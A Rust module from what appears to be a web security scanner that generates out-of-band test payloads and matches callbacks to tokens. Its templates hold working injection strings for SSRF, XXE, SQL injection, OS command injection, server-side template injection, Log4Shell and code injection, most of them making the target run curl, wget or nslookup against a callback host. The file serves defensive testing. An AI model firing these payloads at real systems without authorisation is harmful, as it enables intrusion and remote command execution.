//! Out-of-band checks: payloads that make the target call ProxyMind's
//! OAST listener over HTTP, or look up a name in its DNS zone. Each probe
//! carries its own token, so a callback names the insertion point and the
//! payload that caused it. Pure: the service sends the probes and matches
//! interactions to tokens.
//!
//! | check | where | payloads |
//! |---|---|---|
//! | `ssrf_oob` | URL-like parameters, Referer | the callback URL (and `http://<dns name>/`) |
//! | `xxe_oob` | XML bodies | an external DTD (parameter entity) and an external general entity |
//! | `sql_oob` | parameters, cookies, headers | SQL Server `xp_dirtree`, MySQL `LOAD_FILE` (UNC), Oracle `UTL_HTTP` and XML, PostgreSQL `dblink` |
//! | `cmd_oob` | parameters, cookies, headers | `curl`, `wget`, `nslookup` after `;`, `|`, `$()`, backticks |
//! | `ssti_oob` | parameters | Jinja2, Twig, FreeMarker, Velocity, ERB, Spring EL running `curl` |
//! | `log4shell` | parameters, headers | `${jndi:ldap://<dns name>/…}` (needs the DNS zone) |
//! | `code_oob` | parameters | Node, Python and PHP code that fetches the callback URL |
//!
//! Commands are harmless (a request to our listener); the policy gate still
//! classifies every payload before anything is sent.

use crate::active::{ActiveIssue, Point, PointKind, Probe, inject, points_with, split_body};

pub const CHECKS: &[&str] = &["ssrf_oob", "xxe_oob", "sql_oob", "cmd_oob", "ssti_oob", "log4shell", "code_oob"];

/// Where callbacks go: the HTTP listener's public URL and/or a DNS zone.
#[derive(Debug, Clone, Default)]
pub struct Callback {
    /// e.g. `http://oast.example.com:8085`
    pub url: Option<String>,
    /// e.g. `oast.example.com` (tokens become `<token>.oast.example.com`)
    pub domain: Option<String>,
}

impl Callback {
    pub fn is_set(&self) -> bool {
        self.url.is_some() || self.domain.is_some()
    }

    fn url_for(&self, token: &str) -> Option<String> {
        self.url.as_ref().map(|u| format!("{}/{token}", u.trim_end_matches('/')))
    }

    fn host_for(&self, token: &str) -> Option<String> {
        self.domain.as_ref().map(|d| format!("{token}.{}", d.trim_end_matches('.')))
    }

    /// The template with `{URL}` and `{HOST}` filled for `token`, or None
    /// when it needs one this callback doesn't have.
    pub fn fill(&self, template: &str, token: &str) -> Option<String> {
        let mut out = template.to_string();
        if out.contains("{URL}") {
            out = out.replace("{URL}", &self.url_for(token)?);
        }
        if out.contains("{HOST}") {
            out = out.replace("{HOST}", &self.host_for(token)?);
        }
        Some(out)
    }
}

/// A probe and the token its callback will carry.
#[derive(Debug, Clone)]
pub struct OobProbe {
    pub probe: Probe,
    pub token: String,
    /// e.g. `SQL Server`, `sh (curl)`, `Jinja2`
    pub family: &'static str,
}

fn url_like_name(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    [
        "url",
        "uri",
        "link",
        "href",
        "src",
        "source",
        "dest",
        "destination",
        "redirect",
        "next",
        "return",
        "callback",
        "webhook",
        "hook",
        "feed",
        "rss",
        "image",
        "img",
        "avatar",
        "icon",
        "proxy",
        "fetch",
        "load",
        "host",
        "domain",
        "site",
        "server",
        "endpoint",
        "target",
        "path",
        "file",
        "document",
        "remote",
        "api",
    ]
    .iter()
    .any(|k| n == *k || n.ends_with(k) || n.starts_with(k))
}

fn url_like_value(v: &str) -> bool {
    let v = v.trim().to_ascii_lowercase();
    v.starts_with("http://") || v.starts_with("https://") || v.starts_with("//") || {
        // a bare host name: letters, digits, dots and dashes with a dot
        v.contains('.')
            && !v.contains(' ')
            && v.split('.').all(|l| !l.is_empty() && l.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'))
            && v.rsplit('.').next().is_some_and(|tld| tld.chars().all(|c| c.is_ascii_alphabetic()))
    }
}

/// Payload templates for a point and check (`{URL}`, `{HOST}`, `{O}` = original value).
fn templates(check: &str, pt: &Point) -> Vec<(&'static str, &'static str)> {
    let header = pt.kind == PointKind::Header;
    match check {
        "ssrf_oob" => {
            let referer = header && pt.name == "referer";
            if referer || (!header && (url_like_name(&pt.name) || url_like_value(&pt.original))) {
                vec![("HTTP", "{URL}"), ("DNS", "http://{HOST}/")]
            } else {
                vec![]
            }
        }
        "sql_oob" => vec![
            ("SQL Server", "{O}';EXEC master..xp_dirtree '\\\\{HOST}\\pm'-- -"),
            ("MySQL (Windows)", "{O}' AND LOAD_FILE(CONCAT('\\\\\\\\','{HOST}','\\\\pm'))-- -"),
            ("Oracle", "{O}'||UTL_HTTP.REQUEST('{URL}')||'"),
            (
                "Oracle (XML)",
                "{O}'||(SELECT EXTRACTVALUE(XMLTYPE('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % pm SYSTEM \"{URL}\"> %pm;]>'),'/l') FROM DUAL)||'",
            ),
            ("PostgreSQL", "{O}';SELECT dblink_connect('host={HOST} user=pm dbname=pm')-- -"),
        ],
        "cmd_oob" if pt.kind != PointKind::Path => vec![
            ("sh (curl)", "{O};curl {URL};"),
            ("sh (curl)", "{O}|curl {URL}"),
            ("sh (curl)", "{O}$(curl {URL})"),
            ("sh (curl)", "{O}`curl {URL}`"),
            ("sh (wget)", "{O};wget -q -O- {URL};"),
            ("sh (nslookup)", "{O};nslookup {HOST};"),
            ("sh (nslookup)", "{O}$(nslookup {HOST})"),
            ("Windows cmd (nslookup)", "{O}&nslookup {HOST}&"),
        ],
        "ssti_oob" if !header && pt.kind != PointKind::Path && pt.kind != PointKind::Cookie => vec![
            ("Jinja2", "{{cycler.__init__.__globals__.os.popen('curl {URL}').read()}}"),
            ("Twig", "{{['curl {URL}']|filter('system')}}"),
            ("FreeMarker", "<#assign pm=\"freemarker.template.utility.Execute\"?new()>${pm(\"curl {URL}\")}"),
            (
                "Velocity",
                "#set($pm=\"\")$pm.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"curl {URL}\")",
            ),
            // No backticks or $(): in a shell they would run anyway and look like SSTI.
            ("ERB", "<%= system('curl {URL}') %>"),
            ("Spring EL", "${T(java.lang.Runtime).getRuntime().exec('curl {URL}')}"),
        ],
        "log4shell" if pt.kind != PointKind::Path => {
            vec![("Log4j (LDAP)", "${jndi:ldap://{HOST}/pm}"), ("Log4j (DNS)", "${jndi:dns://{HOST}/pm}")]
        }
        "code_oob" if !header && pt.kind != PointKind::Path && pt.kind != PointKind::Cookie => vec![
            ("Node.js", "{O}';require('http').get('{URL}');'"),
            ("Python", "{O}';__import__('urllib.request').request.urlopen('{URL}');'"),
            ("PHP", "{O}';file_get_contents('{URL}');//"),
        ],
        _ => vec![],
    }
}

/// XXE payloads for an XML body: an external DTD through a parameter
/// entity, and an external general entity used in the root element.
fn xxe_bodies(body: &str) -> Vec<(&'static str, String)> {
    let b = body.trim_start();
    // Keep the XML declaration first; the DOCTYPE goes right after it.
    let (decl, rest) = match b.strip_prefix("<?xml").and_then(|r| r.find("?>").map(|i| i + 7)) {
        Some(end) => b.split_at(end),
        None => ("", b),
    };
    // The root element: the first tag that isn't a declaration or comment.
    let Some(root_at) =
        rest.char_indices().find(|(i, c)| *c == '<' && !rest[i + 1..].starts_with(['?', '!'])).map(|(i, _)| i)
    else {
        return Vec::new();
    };
    let Some(root_end) = rest[root_at..].find('>').map(|i| root_at + i + 1) else { return Vec::new() };
    let self_closing = rest[..root_end].ends_with("/>");
    let mut out =
        vec![("external DTD", format!("{decl}<!DOCTYPE pm [<!ENTITY % pmx SYSTEM \"{{URL}}\"> %pmx;]>{rest}"))];
    if !self_closing {
        out.push((
            "external entity",
            format!(
                "{decl}<!DOCTYPE pm [<!ENTITY pmx SYSTEM \"{{URL}}\">]>{}&pmx;{}",
                &rest[..root_end],
                &rest[root_end..]
            ),
        ));
    }
    out
}

fn is_xml(head: &str, body: &str) -> bool {
    let ct = head
        .lines()
        .find_map(|l| l.split_once(':').filter(|(k, _)| k.trim().eq_ignore_ascii_case("content-type")).map(|(_, v)| v))
        .unwrap_or("")
        .to_ascii_lowercase();
    ct.contains("xml") || body.trim_start().starts_with("<?xml")
}

/// The out-of-band probes for `raw` (`checks` empty: all), each with a
/// fresh token from `token`, at most `limit`.
pub fn probes(
    raw: &str,
    checks: &[String],
    cb: &Callback,
    id_segments: &[usize],
    limit: usize,
    mut token: impl FnMut() -> String,
) -> Vec<OobProbe> {
    let want = |c: &str| checks.is_empty() || checks.iter().any(|x| x == c);
    let mut out = Vec::new();
    if !cb.is_set() {
        return out;
    }
    if want("xxe_oob")
        && let Some((head, body)) = split_body(raw)
        && is_xml(head, body)
    {
        let sep = if raw.contains("\r\n\r\n") { "\r\n\r\n" } else { "\n\n" };
        for (family, tpl) in xxe_bodies(body) {
            let t = token();
            let Some(filled) = cb.fill(&tpl, &t) else { continue };
            let new_raw = format!("{head}{sep}{filled}");
            out.push(OobProbe {
                probe: Probe { check: "xxe_oob", point: Point::body(), payload: filled, raw: new_raw.into_bytes() },
                token: t,
                family,
            });
        }
    }
    for pt in points_with(raw, id_segments) {
        for check in CHECKS.iter().filter(|c| **c != "xxe_oob" && want(c)) {
            for (family, tpl) in templates(check, &pt) {
                if out.len() >= limit {
                    return out;
                }
                let t = token();
                let Some(payload) = cb.fill(&tpl.replace("{O}", &pt.original), &t) else { continue };
                let Some(r) = inject(raw, &pt, &payload) else { continue };
                out.push(OobProbe { probe: Probe { check, point: pt.clone(), payload, raw: r }, token: t, family });
            }
        }
    }
    out
}

/// The issue for a probe whose token called back. `seen` describes the
/// interactions (e.g. `HTTP GET /<token> from 10.0.0.5`).
pub fn issue(p: &OobProbe, seen: &str) -> ActiveIssue {
    let title = match p.probe.check {
        "ssrf_oob" => "Server-side request forgery (the server fetched our URL)",
        "xxe_oob" => "XML external entity injection (the parser fetched our DTD)",
        "sql_oob" => "SQL injection (out-of-band: the database contacted us)",
        "cmd_oob" => "OS command injection (out-of-band: a command contacted us)",
        "ssti_oob" => "Server-side template injection (out-of-band: the template ran a command)",
        "log4shell" => "Log4Shell-style JNDI lookup (CVE-2021-44228)",
        _ => "Code injection (out-of-band: injected code contacted us)",
    };
    let severity = if p.probe.check == "ssrf_oob" { "medium" } else { "high" };
    ActiveIssue {
        check: p.probe.check,
        title,
        severity,
        point: format!("{:?} {}", p.probe.point.kind, p.probe.point.name).to_lowercase(),
        payload: p.probe.payload.clone(),
        evidence: format!("{} payload; callback: {seen}", p.family),
        prove_with: Some("proof_run oracle oast with {{oast}} (or {{oast_dns}}) in this insertion point".into()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tokens() -> impl FnMut() -> String {
        let mut n = 0;
        move || {
            n += 1;
            format!("{n:020x}")
        }
    }

    fn http() -> Callback {
        Callback { url: Some("http://cb.test:8085".into()), domain: None }
    }

    #[test]
    fn fills_callbacks_and_skips_what_it_cannot() {
        let cb = http();
        assert_eq!(cb.fill("{URL}", "abc").as_deref(), Some("http://cb.test:8085/abc"));
        assert_eq!(cb.fill("nslookup {HOST}", "abc"), None, "no DNS zone");
        let both = Callback { domain: Some("oast.test.".into()), ..http() };
        assert_eq!(both.fill("x {HOST}", "abc").as_deref(), Some("x abc.oast.test"));
        assert!(
            probes("GET /?u=http://a.test/ HTTP/1.1\r\n\r\n", &[], &Callback::default(), &[], 99, tokens()).is_empty()
        );
    }

    #[test]
    fn ssrf_targets_url_like_points_and_referer() {
        let raw = "GET /fetch?url=http://a.test/x&q=shoe HTTP/1.1\r\nHost: s\r\nReferer: http://s/\r\n\r\n";
        let ps = probes(raw, &["ssrf_oob".into()], &http(), &[], 99, tokens());
        let at: Vec<(&str, &str)> =
            ps.iter().map(|p| (p.probe.point.name.as_str(), p.probe.payload.as_str())).collect();
        assert_eq!(
            at,
            [
                ("url", "http://cb.test:8085/00000000000000000001"),
                ("referer", "http://cb.test:8085/00000000000000000003")
            ]
        );
        assert!(String::from_utf8_lossy(&ps[0].probe.raw).starts_with("GET /fetch?url=http%3A%2F%2Fcb.test%3A8085%2F"));
        assert_ne!(ps[0].token, ps[1].token, "one token per probe");
    }

    #[test]
    fn injection_payloads_and_dns_only_ones() {
        let raw = "GET /ping?host=127.0.0.1 HTTP/1.1\r\nUser-Agent: curl/8\r\n\r\n";
        let ps = probes(raw, &["cmd_oob".into(), "log4shell".into(), "sql_oob".into()], &http(), &[], 999, tokens());
        assert!(ps.iter().any(|p| p.probe.payload == format!("127.0.0.1;curl http://cb.test:8085/{};", p.token)));
        assert!(!ps.iter().any(|p| p.probe.check == "log4shell"), "JNDI needs a DNS name");
        assert!(ps.iter().any(|p| p.probe.check == "sql_oob" && p.family == "Oracle"));
        assert!(!ps.iter().any(|p| p.family == "SQL Server"), "UNC paths need a DNS name");
        let dns = Callback { domain: Some("o.test".into()), ..http() };
        let ps = probes(raw, &["log4shell".into()], &dns, &[], 999, tokens());
        let ua = ps.iter().find(|p| p.probe.point.name == "user-agent").unwrap();
        assert_eq!(ua.probe.payload, format!("${{jndi:ldap://{}.o.test/pm}}", ua.token));
    }

    #[test]
    fn xxe_keeps_the_declaration_and_root() {
        let raw = "POST /import HTTP/1.1\r\nContent-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?>\n<items><item>a</item></items>";
        let ps = probes(raw, &["xxe_oob".into()], &http(), &[], 99, tokens());
        assert_eq!(ps.len(), 2);
        let dtd = String::from_utf8_lossy(&ps[0].probe.raw).into_owned();
        assert!(dtd.ends_with(&format!(
            "\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE pm [<!ENTITY % pmx SYSTEM \"http://cb.test:8085/{}\"> %pmx;]>\n<items><item>a</item></items>",
            ps[0].token
        )), "{dtd}");
        let ent = String::from_utf8_lossy(&ps[1].probe.raw).into_owned();
        assert!(ent.contains("]>\n<items>&pmx;<item>"), "{ent}");
        assert!(
            probes(
                "POST / HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{}",
                &["xxe_oob".into()],
                &http(),
                &[],
                9,
                tokens()
            )
            .is_empty()
        );
    }

    #[test]
    fn issues_name_the_point() {
        let raw = "GET /?q=1 HTTP/1.1\r\n\r\n";
        let ps = probes(raw, &["ssti_oob".into()], &http(), &[], 99, tokens());
        let i = issue(&ps[0], "HTTP GET /x from 127.0.0.1");
        assert_eq!((i.check, i.point.as_str(), i.severity), ("ssti_oob", "query q", "high"));
        assert!(i.evidence.starts_with("Jinja2 payload"));
    }
}
